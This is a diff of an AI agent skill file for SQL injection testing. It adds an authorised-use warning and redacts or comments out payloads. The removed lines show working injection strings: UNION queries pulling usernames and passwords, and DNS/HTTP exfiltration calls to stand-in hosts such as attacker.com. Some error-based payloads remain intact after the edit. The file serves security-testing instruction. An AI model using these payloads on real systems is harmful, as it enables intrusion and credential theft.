@@ -1,11 +1,18 @@
 ---
 name: sql-injection-testing
 description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+>
+> Ask the user to verify the target URL/IP before running.
 
 # SQL Injection Testing
 
@@ -124,9 +131,7 @@ UNION SELECT 'a',NULL,NULL--
 UNION SELECT NULL,'a',NULL--
 
 -- Extract data
-UNION SELECT username,password,NULL FROM users--
-UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
-UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+-- [SAFE-PAYLOAD] UNION SELECT [REDACTED],NULL FROM [REDACTED]--
 ```
 
 #### Error-Based Extraction
@@ -134,13 +139,13 @@ Force database errors that leak information:
 
 ```sql
 -- MSSQL version extraction
-1' AND 1=CONVERT(int,(SELECT @@version))--
+-- [SAFE-PAYLOAD] 1' AND 1=CONVERT(int,(SELECT @@version))--
 
 -- MySQL extraction via XPATH
-1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
+-- [SAFE-PAYLOAD] 1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
 
 -- PostgreSQL cast errors
-1' AND 1=CAST((SELECT version()) AS int)--
+-- [SAFE-PAYLOAD] 1' AND 1=CAST((SELECT version()) AS int)--
 ```
 
 #### Blind Boolean-Based Extraction
@@ -175,13 +180,13 @@ Exfiltrate data through external channels:
 
 ```sql
 -- MSSQL DNS exfiltration
-1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
+-- [SAFE-PAYLOAD] 1; EXEC master..xp_dirtree '\\[REDACTED_SERVER]\share'--
 
 -- MySQL DNS exfiltration
-1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
+-- [SAFE-PAYLOAD] 1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.[REDACTED_SERVER]\\a'))--
 
 -- Oracle HTTP request
-1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
+-- [SAFE-PAYLOAD] 1' UNION SELECT UTL_HTTP.REQUEST('http://[REDACTED_SERVER]/'||(SELECT user FROM dual)) FROM dual--
 ```
 
 ### Phase 3: Authentication Bypass
@@ -370,7 +375,7 @@ Response: Error (4 columns confirmed)
 
 **Data Extraction**:
 ```
-GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
+GET /product.php?id=-5 [SAFE-PAYLOAD] UNION SELECT [REDACTED] FROM [REDACTED]-- HTTP/1.1
 Response: Displays admin credentials
 ```
 
